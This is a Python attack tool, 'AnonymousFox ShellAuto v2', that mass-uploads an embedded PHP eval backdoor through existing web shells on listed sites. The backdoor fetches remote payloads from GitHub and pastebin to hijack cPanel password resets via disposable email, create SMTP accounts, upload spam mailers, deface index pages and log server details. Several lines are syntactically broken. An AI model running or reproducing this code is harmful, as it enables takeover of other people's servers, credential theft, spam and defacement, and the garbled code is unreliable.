import  re , sys , requests , os , random, string , time
from time import time as timer
from colorama import Fore
from colorama import Style
from pprint import pprint
from colorama import init
init(autoreset=True)

fr  =   Fore.RED
fc  =   Fore.CYAN
fw  =   Fore.WHITE
fg  =   Fore.GREEN
fm  =   Fore.MAGENTA
   
def URLdomain(site):
	if site.startswith("http://") :
		site = site.replace("http://","")
	elif site.startswith("https://") :
		site = site.replace("https://","")
	else :
		pass
	pattern = re.compile('(.*)/')
	while re.findall(pattern,site):
		sitez = re.findall(pattern,site)
		site = sitez[0]
	return site

def file_get_contents(filename):
	with open(filename) as f:
		return f.read()

def ran(length):
	letters = string.ascii_lowercase
	return ''.join(random.choice(letters) for i in range(length))

print ("""  
  [#] Create By ::
	  ___                                                    ______        
	 / _ \                                                   |  ___|       
	/ /_\ \_ __   ___  _ __  _   _ _ __ ___   ___  _   _ ___ | |_ _____  __
	|  _  | '_ \ / _ \| '_ \| | | | '_ ` _ \ / _ \| | | / __||  _/ _ \ \/ /
	| | | | | | | (_) | | | | |_| | | | | | | (_) | |_| \__ \| || (_) >  < 
	\_| |_/_| |_|\___/|_| |_|\__, |_| |_| |_|\___/ \__,_|___/\_| \___/_/\_\ 
	                          __/ |
	                         |___/ ShellAuto v2
""")

shell = """<?php error_reporting(0); function style($urlStyle) {$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $urlStyle);curl_setopt($ch, CURLOPT_REFERER, $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']);$style = curl_exec($ch);curl_close($ch);return $style;} echo '<head><title>AnonymousFox</title><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><link href="https://maxcdnbootstrapcdn.com/bootstrap/cosmo/bootstrap.min.css" rel="stylesheet" ><script src="https://maxcdnbootstrapcdn.com/bootstrap/js/bootstrap.min.js"></script><script src="'.style('https://maxcdnbootstrapcdn.com/bootstrap/js/style.js').'"></script></head>'; $code = $_GET["php"]; if (empty($code) or !stristr($code, "http")){ exit; } else { $php=file_get_contents($code); if (empty($php)){ $php = curl($code); } $php=str_replace("<?php", "", $php); $php=str_replace("<?php", "", $php); $php=str_replace("?>", "", $php); eval($php); } function curl($url) { $curl = curl_init(); curl_setopt($curl, CURLOPT_TIMEOUT, 40); curl_setopt($curl, CURLOPT_RETURNTRANSFER, TRUE); curl_setopt($curl, CURLOPT_URL, $url); curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, TRUE); if (stristr($url,"https://")) { curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0); } curl_setopt($curl, CURLOPT_HEADER, false); return curl_exec ($curl); } ?>"""


requests.packages.urllib3.disable_warnings()


try:
	target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
	path = str(sys.argv[0]).split('\\')
	exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')

def file_get_contents(filename):
	with open(filename) as f:
		return f.read()

def changemail():
	session = requests.session()
	payload = {"f": "get_email_address"}
	r = session.get("http://api.guerrillamail.com/ajax.php", params=payload)
	email = r.json()["email_addr"]
	return email,session.cookies

def checkinbox(cookies,user):
	Scode='AnonymousFox'
	cookies={"PHPSESSID":cookies}
	session = requests.session()
	payload = {"f": "set_email_user","email_user":user,"lang":"en"}
	r = session.get("http://api.guerrillamail.com/ajax.php", params=payload,cookies=cookies)
	payload = {"f": "check_email", "seq": "1"}
	r = session.get("http://api.guerrillamail.com/ajax.php", params=payload,cookies=cookies)
	for email in r.json()["list"]:
		if 'cpanel' in email["mail_from"]:
			email_id = email["mail_id"]
			payload = {"f": "fetch_email", "email_id": email_id}
			r = session.get("http://api.guerrillamail.com/ajax.php", params=payload,cookies=cookies)
			Scode = r.json()['mail_body'].split('<p style="border:1px solid;margin:8px;padding:4px;font-size:16px;width:250px;font-weight:bold;">')[1].split('</p>')[0]
			payload = {"f": "del_email","email_ids[]":int(email_id)}
			r = session.get("http://api.guerrillamail.com/ajax.php", params=payload,cookies=cookies)
		else :
			Scode = 'AnonymousFox'
	return Scode


def resetPassword(backdor,t) :
	try :
		print (' {}[*] Reset Password ..... {}(Waiting)'.format(fw, fr))
		token = ran(3)+'f0x'+ran(3)
		post0 = {'resetlocal': token, 'get3': 'get3' , 'token':t}
		check = requests.post(backdor + '?php=https://raw.githubusercontent.com/JExCoders/AnyFox/master/37.txt', data=post0, timeout=15).content
		if 'Error-one' in check:
			print (' {}[-] There is no cPanel'.format(fr))
		elif 'Error-two' in check:
			print (' {}[-] Reset Password Disabled'.format(fr))
		elif '<cpanel>' in check :
			cpanelRt = re.findall(re.compile(':2083\|(.*)</cpanel>'), check)[0]
			domain = re.findall(re.compile('https://(.*):2083\|'), check)[0]
			print (' {}[+] Succeeded => {}https://{}:2083|{}'.format(fg, fr, domain, cpanelRt))
			open('Results/cPanelreset.txt', 'a').write('https://{}:2083|{}'.format(domain, cpanelRt) + '\n')
		else :
			src = str(changemail())
			email = re.findall(re.compile('u\'(.*)\', <RequestsCookieJar'), src)[0]
			cookies = re.findall(re.compile('name=\'PHPSESSID\', value=\'(.*)\', port='), src)[0]
			post1 = {'email': email, 'get': 'get'}
			check = requests.post(backdor+'?php=https://raw.githubusercontent.com/JExCoders/AnyFox/master/37.txt', data=post1,timeout=15).content
			time.sleep(10)
			code = checkinbox(cookies, email)
			start = timer()
			while ((code == 'AnonymousFox') and ((timer() - start) < 90)):
				time.sleep(30)
				code = checkinbox(cookies, email)
			if (code == 'AnonymousFox') :
				print (' {}[-] Reset Password Failed'.format(fr))
				pass
			else :
				post2 = {'code': code, 'get2': 'get2'}
				check2 = requests.post(backdor+'?php=https://raw.githubusercontent.com/JExCoders/AnyFox/master/37.txt',data=post2, timeout=15).content
				if '<cpanel>' in check2 :
					cpanelRt = re.findall(re.compile(':2083\|(.*)</cpanel>'), check2)[0]
					domain = re.findall(re.compile('https://(.*):2083\|'), check2)[0]
					print (' {}[+] Succeeded => {}https://{}:2083|{}'.format(fg, fr, domain, cpanelRt))
					open('Results/cPanelreset.txt', 'a').write('https://{}:2083|{}'.format(domain, cpanelRt) + '\n')
				else :
					print (' {}[-] Reset Password Failed'.format(fr))
	except:
		print(' {}[-] Failed'.format(fr))
        
def getSMTP(backdor) :
	try :
		print (' {}[*] Create SMTP ..... {}(Waiting)'.format(fw, fr))
		getSMTP = requests.get(backdor + '?php=https://raw.githubusercontent.com/JExCoders/AnyFox/master/32.txt', timeout=30).content
		if '<smtp>' in getSMTP :
			smtp = re.findall(re.compile('<smtp>(.*)</smtp>'), getSMTP)[0]
			print (' {}[+] Succeeded => {}{}'.format(fg,fr,smtp))
			open('Results/SMTP.txt', 'a').write(smtp + '\n')
		else :
			print (' {}[-] Failed'.format(fr))
	except:
		print(' {}[-] Failed'.format(fr))

def uploadMailerOlux(shell,mailerOlux):
	try:
		print(' {}[*] Upload Miller Olux ..... {}(Waiting)'.format(fw, fr))
		mailer_pass = ran(10)
		mailer_text = mailerOlux.replace("AnonymousFox", mailer_pass)
		filename = ran(10) + '.php'
		s1 = shell
		while '/' in s1:
			s1 = s1[s1.index("/") + len("/"):]
		mailer_path = shell.replace(s1, filename)
		filedata = {'a': 'FilesMAn', 'p1': 'uploadFile', 'ne': '', 'charset': 'UTF-8'}
		fileup = {'f': (filename, mailer_text)}
		upMailer = requests.post(shell, data=filedata, files=fileup, timeout=30)
		if upMailer.status_code == 200 :
			print (' {}[+] Succeeded => {}{}?pass={}'.format(fg,fr,mailer_path,mailer_pass))
			open('Results/mailerOlux.txt', 'a').write('{}?pass={}\n'.format(mailer_path,mailer_pass))
		else:
			print (' {}[-] Failed'.format(fr))
	except :
		print (' {}[-] Failed'.format(fr))
        
def uploadMailerXleet(shell,mailerXleet):
	try:
		print (' {}[*] Upload Miller Xleet ..... {}(Waiting)'.format(fw, fr))
		mailer_pass = ran(10)
		mailer_text = mailerXleet.replace("AnonymousFox", mailer_pass)
		filename = ran(10) + '.php'
		s1 = shell
		while '/' in s1:
			s1 = s1[s1.index("/") + len("/"):]
		mailer_path = shell.replace(s1, filename)
		filedata = {'a': 'FilesMAn', 'p1': 'uploadFile', 'ne': '', 'charset': 'UTF-8'}
		fileup = {'f': (filename, mailer_text)}
		upMailer = requests.post(shell, data=filedata, files=fileup, timeout=30)
		if upMailer.status_code == 200 :
			print (' {}[+] Succeeded => {}{}?pass={}'.format(fg,fr,mailer_path,mailer_pass))
			open('Results/mailerXleet.txt', 'a').write('{}?pass={}\n'.format(mailer_path,mailer_pass))
		else:
			print (' {}[-] Failed'.format(fr))
	except :
		print (' {}[-] Failed'.format(fr))

def massUploadFile1(shell,file) :
	try :
		print (' {}[*] Upload File ..... {}(Waiting)'.format(fw, fr))
		filename = ran(10) + '.php'
		s1 = shell
		while '/' in s1:
			s1 = s1[s1.index("/") + len("/"):]
		file_path = shell.replace(s1, filename)
		filedata = {'a': 'FilesMAn', 'p1': 'uploadFile', 'ne': '', 'charset': 'UTF-8'}
		fileup = {'f': (filename, file)}
		upFile = requests.post(shell, data=filedata, files=fileup, timeout=30)
		if upFile.status_code == 200 :
			print (' {}[+] Succeeded => {}{}'.format(fg,fr,file_path))
			open('Results/files_uploaded.txt', 'a').write('{}\n'.format(file_path))
		else:
			print (' {}[-] Failed'.format(fr))
	except :
		print (' {}[-] Failed'.format(fr))
        
def massUploadFile2(backdor,file) :
	try :
		print (' {}[*] Upload File ..... {}(Waiting)'.format(fw, fr))
		filename = ran(10) + '.php'
		fileup = {'file': (filename, file)}
		upFile = requests.post(backdor+'?php=https://raw.githubusercontent.com/JExCoders/AnyFox/master/34.txt',files=fileup, timeout=30)
		if upFile.status_code == 200 :
			file_path = re.findall(re.compile('<yourfile>(.*)</yourfile>'), upFile.content)[0]
			print (' {}[+] Succeeded => {}{}'.format(fg,fr,file_path))
			open('Results/files_uploaded.txt', 'a').write('{}\n'.format(file_path))
		else:
			print (' {}[-] Failed'.format(fr))
	except :
		print (' {}[-] Failed'.format(fr))

def massUploadIndex1(backdor,file,nameF) :
	try :
		print (' {}[*] Upload Index ..... {}(Waiting)'.format(fw, fr))
		fileup = {'file': (nameF, file)}
		upFile = requests.post(backdor+'?php=https://raw.githubusercontent.com/JExCoders/AnyFox/master/34.txt',files=fileup, timeout=30)
		if upFile.status_code == 200 :
			file_path = re.findall(re.compile('<yourfile>(.*)</yourfile>'), upFile.content)[0]
			print (' {}[+] Succeeded => {}{}'.format(fg,fr,file_path))
			open('Results/indexS.txt', 'a').write('{}\n'.format(file_path))
		else:
			print (' {}[-] Failed'.format(fr))
	except :
		print (' {}[-] Failed'.format(fr))

def massUploadIndex2(backdor,file) :
	try :
		print (' {}[*] Upload Index ..... {}(Waiting)'.format(fw, fr))
		filedata = {'index': file, 'up': 'UP INDEX'}
		upFile = requests.post(backdor+'?php=https://raw.githubusercontent.com/JExCoders/AnyFox/master/38.txt', data=filedata, timeout=30)
		if upFile.status_code == 200 :
			file_path = re.findall(re.compile('<yourindex>(.*)</yourindex>'), upFile.content)[0]
			print (' {}[+] Succeeded => {}{}'.format(fg,fr,file_path))
			open('Results/indexS.txt', 'a').write('{}\n'.format(file_path))
		else:
			print (' {}[-] Failed'.format(fr))
	except :
		print (' {}[-] Failed'.format(fr))

def finderScript(backdor,shell) :
	try :
		print (' {}[*] Finder Script ..... {}(Waiting)'.format(fw, fr))
		srcServer = requests.get(backdor + '?php=https://raw.githubusercontent.com/JExCoders/AnyFox/master/33.txt', timeout=60).content
		uname = re.findall(re.compile('<uname><font color="red"><center>(.*)</center> </font><br></uname>'), srcServer)[0]
		pwd = re.findall(re.compile('<pwd><font color="blue"><center>(.*)</center></font><br></pwd>'), srcServer)[0]
		print (' {}[U] '.format(fm) + uname)
		print (' {}[P] '.format(fm) + pwd)
		open('Results/pwd_uname.txt', 'a').write('{}\n{}\n{}\n-----------------------------------------------------------------------------------------------------\n'.format(uname,pwd,shell))
		if '[-] Windows' in srcServer:
			print (' {}[S] Windows'.format(fr))
		else:
			print (' {}[S] Linux server'.format(fg))
			if '2016' in uname or '2015' in uname or '2014' in uname or '2013' in uname or '2012' in uname or '2011' in uname or '2010' in uname:
				open('Results/Roots_servers.txt', 'a').write('{}\n{}\n{}\n-----------------------------------------------------------------------------------------------------\n'.format(uname, pwd, shell))
			if '[+] cPanel' in srcServer:
				print (' {}[+] cPanel script'.format(fg))
				open('Results/cPanels_servers.txt', 'a').write('{}\n{}\n{}\n-----------------------------------------------------------------------------------------------------\n'.format(uname, pwd, shell))
			elif '[+] vHosts' in srcServer:
				print (' {}[+] vHosts script'.format(fg))
				open('Results/vHosts_servers.txt', 'a').write('{}\n{}\n{}\n-----------------------------------------------------------------------------------------------------\n'.format(uname, pwd, shell))
	except:
		print(' {}[-] Failed'.format(fr))

def Shell():
	try :
		print ('   [1] {}Reset Passowrd cPanel'.format(fw))
		print ('   [2] {}Create SMTP'.format(fw))
		print ('   [3] {}finder cPanel/vHosts/Root'.format(fw))
		print ('   [4] {}Upload Mailer (Random)'.format(fw))
		print ('   [5] {}Mass Upload file (Random)'.format(fw))
		print ('   [6] {}Mass Upload Index'.format(fw))
		print ('   [7] {}(Reset Passowrd cPanel + Create SMTP) togther'.format(fw))
		print ("   [0] {}Exit".format(fw))
		w = int(raw_input('\n --> : '))
		print ('' if w != 1 and w != 2 and w != 3 and w != 4 and w != 5 and w != 6 and w != 7)
			print ("      {}Go to hell :P".format(fr))
			sys.exit(0)
		if w == 4 :
			print ('   [1] {}Mailer Olux'.format(fw))
			print ('   [2] {}Mailer xleet'.format(fw))
			tyMailer = int(raw_input('\n --> : '))
			if tyMailer == 1 :
				mailerOlux = requests.get('https://pastebin.com/raw/UX0y8PQN', timeout=15).content
			elif tyMailer == 2 :
				mailerXleet = requests.get('https://pastebin.com/raw/s2dVf0fT', timeout=15).content
			else :
				tyMailer = 1
				mailerOlux = requests.get('https://pastebin.com/raw/UX0y8PQN', timeout=15).content
			print (''
		if w == 5 :
			nameF = str(raw_input(' Filename --> : '))
			if not os.path.isfile(nameF):
				print ("       {}File does not exist !".format(fr))
				sys.exit(0)
			fileSrc = file_get_contents(nameF)
			print ('\n   [1] {}In the same path'.format(fw))
			print ('   [2] {}In the main path'.format(fw))
			tyUP = int(raw_input('\n --> : '))
			if tyUP != 1 and tyUP != 2 :
				tyUP = 1
			print (''
		if w == 6 :
			nameF = str(raw_input(' YourIndex --> : '))
			if not os.path.isfile(nameF):
				print ("       {}File does not exist !".format(fr))
				sys.exit(0)
			fileSrc = file_get_contents(nameF)
			print ('\n   [1] {}if You want Index with the same name , like => http://domain.com/{}'.format(fw,nameF))
			print ('   [2] {}if You want index in the main index , like => http://domain.com/'.format(fw))
			tyUP = int(raw_input('\n --> : '))
			if tyUP != 1 and tyUP != 2 :
				tyUP = 1
			print (''
		newpath = r'Results'
		if not os.path.exists(newpath):
			os.makedirs(newpath)
		sites = open(sys.argv[1],'r')
		t = 'resetpassword'
		for site in sites :
			try :
				url = site.strip())
				print (' --| {}'.format(fc) + url
				filename = ran(10) + '.php'
				s1 = url
				while '/' in s1:
					s1 = s1[s1.index("/") + len("/"):]
				shell_path = url.replace(s1, filename)
				src = requests.get(url, timeout=15).content
				if 'Windows' in src and 'Upload file:' in src :
					filedata = {'a': 'FilesMAn', 'p1': 'uploadFile','ne':'','charset':'UTF-8'}
					fileup = {'f': (filename, shell)}
					up = requests.post(url, data=filedata, files=fileup,timeout=120)
					check = requests.get(shell_path+'?php=https://raw.githubusercontent.com/JExCoders/AnyFox/master/36.txt',timeout=30).content
					if 'AnonymousFox' in check:)
						print (' {}[+] Shell Working => {}{}'.format(fg,fr,shell_path))
						open('Results/backdor.txt', 'a').write(shell_path+'?php=https://raw.githubusercontent.com/JExCoders/AnyFox/master/35.txt\n')
						if w == 1 :
							resetPassword(shell_path,t))
							print (''
						elif w == 2 :
							getSMTP(shell_path))
							print (''
						elif w == 3 :
							finderScript(shell_path,url))
							print (''
						elif w == 4 and tyMailer == 1 :
							uploadMailerOlux(url, mailerOlux))
							print (''
						elif w == 4 and tyMailer == 2 :
							uploadMailerXleet(url, mailerXleet))
							print (''
						elif w == 5 and tyUP == 1 :
							massUploadFile1(url, fileSrc))
							print (''
						elif w == 5 and tyUP == 2 :
							massUploadFile2(shell_path, fileSrc))
							print (''
						elif  w == 6 and tyUP == 1 :
							massUploadIndex1(shell_path, fileSrc, nameF))
							print (''
						elif w == 6 and tyUP == 2 :
							massUploadIndex2(shell_path, fileSrc))
							print (''
						elif w == 7 :
							resetPassword(shell_path, t))
							getSMTP(shell_path)
							print (''
					else :
						print (' {}[-] Upload failed\n'.format(fr))
				else :
					print (' {}[-] Shell NOT Working\n'.format(fr))
			except :
				url = site.strip()
				print (' {}[-] Shell NOT Working\n'.format(fr))
	except :
		pass

Shell()